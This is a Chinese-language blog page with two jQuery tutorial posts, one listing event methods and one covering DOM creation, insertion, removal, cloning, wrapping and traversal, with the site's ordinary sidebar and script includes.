    <h1 class="title"><a href="/2018/01/29/jQuery系列（四）-- 事件/">jQuery系列（四） -- 事件</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h2><ol>
<li><p><code>.click()</code> ==&gt; 单击事件</p>
</li>
<li><p><code>.dblclick()</code> ==&gt; 双击事件</p>
</li>
<li><p><code>.mousedown()</code> ==&gt; 鼠标按键按下时触发</p>
</li>
<li><p><code>.mouseup()</code> ==&gt; 鼠标按键释放时触发</p>
</li>
<li><p><code>.mousemove()</code> ==&gt; 鼠标指针在元素内移动时触发</p>
</li>
<li><p><code>.mouseover()</code> ==&gt; 当鼠标指针进入元素内触发（冒泡）</p>
</li>
<li><p><code>.mouseout()</code> ==&gt; 当鼠标指针离开元素时触发（冒泡）</p>
</li>
<li><p><code>.mouseenter()</code> ==&gt; 当鼠标移入到元素上时触发（不冒泡）</p>
</li>
<li><p><code>.mouseleave()</code> ==&gt; 当鼠标离开元素上时触发（不冒泡）<br><strong>说明：</strong><code>.mouseenter()</code> 和 <code>.mouseleave()</code> 事件只会在绑定它的元素上被调用，而不会在后代节点上触发</p>
</li>
<li><p><code>.hover()</code> ==&gt; 将两个事件函数绑定到匹配元素上，分别当鼠标指针进入和离开元素时被执行。<code>.hover()</code> === <code>.mouseenter()</code> + <code>.mouseleave()</code></p>
</li>
<li><p><code>.focusin()</code> ==&gt; 元素获得焦点时触发</p>
</li>
<li><code>focusout()</code> ==&gt; 元素失去焦点时触发</li>
</ol>
<h2 id="表单事件"><a href="#表单事件" class="headerlink" title="表单事件"></a>表单事件</h2><ol>
<li><code>.focus()</code> ==&gt; 当元素获得焦点时</li>
<li><p><code>.blur()</code> ==&gt; 当元素失去焦点时<br><strong>说明：</strong><code>.focus()</code> 和 <code>.blur()</code> 不支持冒泡事件，只有绑定自身才有效；<code>.focusin()</code> 和 <code>focusout()</code> 支持冒泡事件</p>
</li>
<li><p><code>.change()</code> ==&gt; 监听 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 元素值改变</p>
</li>
<li><p><code>.select()</code> ==&gt; 当在元素中进行文本选择时，此事件只能用在 <code>&lt;input type=&quot;text&quot;&gt;</code> 和 <code>&lt;textarea&gt;</code></p>
</li>
<li><p><code>.submit()</code> ==&gt; 监听表单提交事件</p>
</li>
</ol>
<h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><ol>
<li><p><code>.keydown()</code> ==&gt; 当在一个元素上第一次按下键盘上的键的时。每次获取的内容是之前输入的，当前输入的获取不到</p>
</li>
<li><p><code>.keyup()</code> ==&gt; 当在一个元素上释放按键的时。获取的是触发键盘事件后的文本</p>
</li>
<li><p><code>.keypress()</code> ==&gt; 当浏览器捕获一个元素上键盘输入时。只能捕获单个字符；无法相应系统功能键；不区分小键盘和主键盘的数字字符</p>
</li>
</ol>
<p><strong>说明：</strong><code>.keypress()</code> 主要接收字母、数字等 ANSI 字符，而 <code>.keydown()</code> 和 <code>.keyup()</code> 事件过程可以处理任何不被 <code>.keypress()</code> 识别的击键</p>
<h2 id="多事件"><a href="#多事件" class="headerlink" title="多事件"></a>多事件</h2><ol>
<li><p><code>.on()</code> ==&gt; 多事件绑定</p>
<ul>
<li>多个事件绑定同一函数<br>  <code>$( &#39;ele&#39; ).on( &#39;mouseover mouseout&#39;, () =&gt; {} )</code></li>
<li>多个事件绑定不同函数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$( &apos;ele&apos; ).on( &#123;</span><br><span class="line">    mouseover: () =&gt; &#123;&#125;,</span><br><span class="line">    mouseout: () =&gt; &#123;&#125;</span><br><span class="line">&#125; )</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><code>.off()</code> ==&gt; 移除绑定事件</p>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/jQuery/">jQuery</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-29T00:24:55.000Z"><a href="/2018/01/29/jQuery系列（三）-- DOM/">2018-01-29</a></time>
      
      
  
    <h1 class="title"><a href="/2018/01/29/jQuery系列（三）-- DOM/">jQuery系列（三） -- DOM</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="创建元素与属性"><a href="#创建元素与属性" class="headerlink" title="创建元素与属性"></a>创建元素与属性</h1><p>JavaScript：</p>
<ul>
<li>创建元素：<code>document.createElement()</code></li>
<li>设置属性：<code>setAttribute()</code></li>
<li>添加文本：<code>innerHTML()</code></li>
<li>加入文档：<code>append()</code></li>
</ul>
<p>jQuery：</p>
<ul>
<li>创建元素节点：<code>$( &#39;html结构&#39; )</code></li>
<li>创建文本节点：<code>$( &#39;&lt;div&gt;text node&lt;/div&gt;&#39; )</code></li>
<li>创建属性节点：<code>$( &#39;&lt;div id=&quot;text&quot; class=&quot;className&quot;&gt;text node&lt;/div&gt;&#39; )</code></li>
</ul>
<h1 id="jQuery-DOM-API"><a href="#jQuery-DOM-API" class="headerlink" title="jQuery DOM API"></a>jQuery DOM API</h1><h3 id="DOM-node-插入"><a href="#DOM-node-插入" class="headerlink" title="DOM node 插入"></a>DOM node 插入</h3><ol>
<li><p>内部插入</p>
<ul>
<li><code>.append(content)</code> ==&gt; 向每个匹配的元素内部追加内容。前面是被插入的对象，后面是要在对象内插入的元素内容 </li>
<li><code>.appendTo(obj)</code> ==&gt;  把所有的匹配元素追加到另一个指定的元素集合中。前面是要插入的元素内容，而后面是被插入的对象</li>
</ul>
</li>
<li><p>外部插入</p>
<ul>
<li><code>.after(content)</code> ==&gt; 在匹配元素集合中的每个元素后面插入参数所指定的内容，作为其兄弟节点</li>
<li><code>before(content)</code> ==&gt; 在匹配的元素的前面插入内容</li>
</ul>
</li>
<li><p>内部插入</p>
<ul>
<li><code>.prepend()</code> ==&gt; 向每个匹配的元素内部前置内容</li>
<li><code>.prependTo()</code> ==&gt; 把所有匹配的元素前置到另一个指定的元素集合中</li>
</ul>
</li>
</ol>
<p><strong>说明：</strong><code>.peopend()</code> 方法将指定元素插入到匹配元素里面作为他的第一个子元素。<code>.append()</code> 方法最为最后一个参数。</p>
<ol>
<li>外部插入：content 在前，() 内为元素<ul>
<li><code>.insertAfter()</code> ==&gt; 在目标元素后面插入集合中每个匹配的元素</li>
<li><code>.insertBefore()</code> ==&gt; 在目标元素前面插入集合中每个匹配的元素</li>
</ul>
</li>
</ol>
<h3 id="DOM-node-删除"><a href="#DOM-node-删除" class="headerlink" title="DOM node 删除"></a>DOM node 删除</h3><ul>
<li><code>.empty()</code> ==&gt; 移除指定元素的所有子节点</li>
<li><code>.remove()</code> ==&gt; 将自身移除，同时也会移除元素内部的一切，包括绑定的事件及与该元素相关的 jQuery 数据<br><strong>注意：</strong><code>.remove()</code> 可以传递一个选择器表达式用来过滤将被移除的匹配元素集合，可以选择性地删除节点</li>
<li><code>.detach()</code> ==&gt; 保留数据的删除操作。让一个 web 元素托管，即从当前页面中移除该元素，但保留这个元素的内存模型对象<br><strong>注意：</strong><code>.detach()</code> 方法是 jQuery 特有的，所以它只能处理通过 jQuery 的方法绑定的事件或者数据，可以通过 <code>.append()</code> 是删除的元素重新回到文档流中</li>
</ul>
<h3 id="DOM-node-复制与替换"><a href="#DOM-node-复制与替换" class="headerlink" title="DOM node 复制与替换"></a>DOM node 复制与替换</h3><ul>
<li><p><code>.clone()</code> ==&gt; 复制所有匹配的元素集合，包括所有匹配元素、匹配元素的下级元素和文字节点<br><strong>注意：</strong>若节点有事件或者数据之类的其他处理，我们需要通过 <code>.clone(true)</code> 传递一个布尔值 <code>true</code> 用来指定，这样不仅仅是简单的克隆节点结构，还把附带的事件与数据复制。</p>
</li>
<li><p><code>.replaceWith(newContent)</code> ==&gt; 用提供的内容替换集合中所有匹配的元素并且返回被删除元素的集合</p>
</li>
<li><p><code>.replaceAll(target)</code> ==&gt; 用集合的匹配元素替换每个目标元素<br><strong>注意：</strong></p>
<ol>
<li><code>.replaceWith()</code> 和 <code>.replaceAll()</code> 会删除与节点相关联的所有数据和 event handler</li>
<li><code>.replaceWith()</code> 返回 jQuery 对象，可链式使用，但返回的 jQuery 对象引用的是替换前的节点，而不是通过 <code>.replaceWith() / .replaceAll()</code> 方法替换后的节点</li>
</ol>
</li>
<li><p><code>.wrap()</code> ==&gt; 将元素用其他元素包裹起来，即给元素增加一个父元素，返回原始的元素集，以便以后使用链式方法</p>
</li>
<li><code>.unwrap()</code> ==&gt; 将匹配的元素的父级元素删除，保留自身在原来的位置</li>
<li><code>.wrapAll()</code> ==&gt; 将集合中的元素用其他元素包裹起来，增加一个父元素（每个元素分别包裹）</li>
<li><code>.wrapInner()</code> ==&gt; 将集合中的元素内部所有的子元素用其他元素包裹起来，并当做指定元素的子元素</li>
</ul>
<h3 id="jQuery-遍历"><a href="#jQuery-遍历" class="headerlink" title="jQuery 遍历"></a>jQuery 遍历</h3><ul>
<li><p><code>.children()</code> ==&gt; 返回匹配元素集合中每个元素的所有子元素，并且可以接受一个选择器</p>
</li>
<li><p><code>.find()</code> ==&gt; 查找 DOM 树中元素的后代元素（只在后代中遍历，不包括自己）</p>
</li>
<li><code>.parent()</code> ==&gt; 查找集合中每一个元素的父元素</li>
<li><code>.parents()</code> ==&gt; 查找集合中每一个元素的祖辈元素</li>
<li><p><code>.closest()</code> ==&gt; 从元素本身开始，在 DOM 树上逐级向上元素匹配，并返回最先匹配的祖先元素<br><strong>注意：</strong><code>.parents()</code> 和 <code>.closest()</code> 区别</p>
<ol>
<li>起始位置不同：<code>.parents()</code> 开始于父元素； <code>.closest()</code> 开始于当前元素</li>
<li>遍历的目标不同：<code>.parents()</code> 一直查找到根元素，并将匹配的元素加入集合； <code>.closest()</code> 向上查找，直到找到一个匹配的就停止查找</li>
<li>结果不同：<code>.parents()</code> 返回的是包含0个或1个或多个元素的 jQuery 对象； <code>.closest()</code> 返回的是包含0个或1个元素的 jQuery 对象</li>
</ol>
</li>
<li><p><code>.next()</code> ==&gt; 查找指定元素集合中每一个元素紧邻的后面同辈元素的元素集合</p>
</li>
<li><code>.prev()</code> ==&gt; 查找指定元素集合中每一个元素紧邻的前面同辈元素的元素集合</li>
<li><code>.siblings()</code> ==&gt; 查找指定元素集合中每一个元素的同辈元素</li>
<li><code>.add()</code> ==&gt; 创建一个新的 jQuery 对象，元素添加到匹配的元素集合中</li>
<li><code>.each()</code> ==&gt; 一个 for 循环的迭代器，迭代 jQuery 对象中的每一个 DOM 元素，每次回调函数执行时，会传递当前循环次数作为参数（从0开始）<br> <code>.each()</code> 通过回调的方式处理，并且会有两个固定的实参 ==&gt; 索引（index）和元素（element）<br> <code>.each( (index,element) =&gt; {} )</code></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/jQuery/">jQuery</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  

  <nav id="pagination">
  
    <a href="/archives/" class="alignleft prev">Prev</a>
  
  
    <a href="/archives/page/3/" class="alignright next">Next</a>
  
  <div class="clearfix"></div>
</nav>


</div></div>
      <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/tags/CSS/">CSS</a><small>10</small></li>
  
    <li><a href="/tags/HTML/">HTML</a><small>1</small></li>
  
    <li><a href="/tags/HTTP/">HTTP</a><small>9</small></li>
  
    <li><a href="/tags/JavaScript/">JavaScript</a><small>11</small></li>
  
    <li><a href="/tags/JavaScript-进阶/">JavaScript 进阶</a><small>4</small></li>
  
    <li><a href="/tags/Plugin/">Plugin</a><small>1</small></li>
  
    <li><a href="/tags/jQuery/">jQuery</a><small>4</small></li>
  
    <li><a href="/tags/前端基础/">前端基础</a><small>4</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>1</small></li>
  
    <li><a href="/tags/总结/">总结</a><small>4</small></li>
  
  </ul>
</div>


</aside>
    
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="aligncenter">
  
  &copy; 2018 吴博文
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>



<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>
<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script src="https://www.zybuluo.com/static/MathJax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</script>


  
    <!-- Go to www.addthis.com/dashboard to customize your tools -->
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-59a3e3079f1b7ad5"></script> 
  

</body>
</html>
